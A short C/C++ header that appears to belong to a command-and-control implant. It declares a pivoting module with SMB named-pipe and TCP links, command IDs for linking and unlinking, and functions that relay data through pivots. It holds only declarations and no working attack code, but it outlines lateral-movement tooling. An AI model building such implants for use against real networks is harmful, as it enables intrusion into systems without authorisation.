#pragma once

#include "std.cpp"
#include "Packer.h"

#define COMMAND_PIVOT_EXEC   37
#define COMMAND_LINK	     38
#define COMMAND_UNLINK	     39

#define PIVOT_TYPE_SMB		  1
#define PIVOT_TYPE_TCP		  2
#define PIVOT_TYPE_DISCONNECT 10

struct PivotData {
	ULONG  Id;
	ULONG  Type;
	HANDLE Channel;
	SOCKET Socket;
};

typedef struct _Pivotter {
	Vector<PivotData> pivots;
} Pivotter;

Pivotter* Pivotter_Create();
void Pivotter_ProcessPivots(Pivotter* self, Packer* packer);
void Pivotter_LinkPivotSMB(Pivotter* self, ULONG taskId, ULONG commandId, CHAR* pipename, Packer* outPacker);
void Pivotter_LinkPivotTCP(Pivotter* self, ULONG taskId, ULONG commandId, CHAR* address, WORD port, Packer* outPacker);
void Pivotter_UnlinkPivot(Pivotter* self, ULONG taskId, ULONG commandId, ULONG pivotId, Packer* outPacker);
void Pivotter_WritePivot(Pivotter* self, ULONG pivotId, BYTE* data, ULONG size);